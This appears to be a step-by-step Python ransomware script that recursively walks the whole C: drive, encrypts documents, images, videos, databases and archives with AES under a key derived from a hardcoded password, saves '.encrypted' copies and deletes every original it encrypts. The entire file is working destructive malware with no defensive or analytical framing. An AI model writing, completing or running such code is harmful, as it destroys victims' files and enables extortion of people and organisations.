# Importing all necessary libraries
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes


# Step 2: Deriving the encryption key from PBKDF2
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256  
password = "T9$gVlx7@QzL#r3mW2e^Np8s"
salt = get_random_bytes(16)  # Still needed for PBKDF2
key = PBKDF2(password, salt, dkLen=32, count=100000, hmac_hash_module=SHA256)



# Step 3: Function to encrypt a file 
def encrypt_file(file_path, key):
    try:
        iv = get_random_bytes(16)  # Generate a random initialization vector
        cipher = AES.new(key, AES.MODE_CBC, iv)  # Create a new AES cipher
        with open(file_path, 'rb') as f:
            file_data = f.read()  # Read the file data
        encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))  # Encrypt the data with padding
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(salt + iv + encrypted_data)  # Write the salt, IV, and encrypted data to a new file
        os.remove(file_path)  # Remove the original file
        print(f"Successfully encrypted: {file_path}")
    except Exception as e:
        print(f"Failed to encrypt: {file_path} | Error: {e}")
 

# Step 4: Creating Main Script
if __name__ == "__main__":
    import os

    # Define target extensions
    target_extensions = (
        '.pdf', '.docx', '.txt', '.rtf', '.jpg', '.jpeg', '.png', '.gif', '.bmp',
        '.tiff', '.mp4', '.avi', '.mov', '.wmv', '.sql', '.db', '.mdb', '.zip', '.rar'
    )

    # Set root directory (entire C drive)
    root_dir = r"C:\\"

    print(f"Scanning directory: {root_dir}")

    for foldername, subfolders, filenames in os.walk(root_dir):
        for filename in filenames:
            if filename.lower().endswith(target_extensions):
                file_path = os.path.join(foldername, filename)
                print(f"Encrypting: {file_path}")
                encrypt_file(file_path, key)
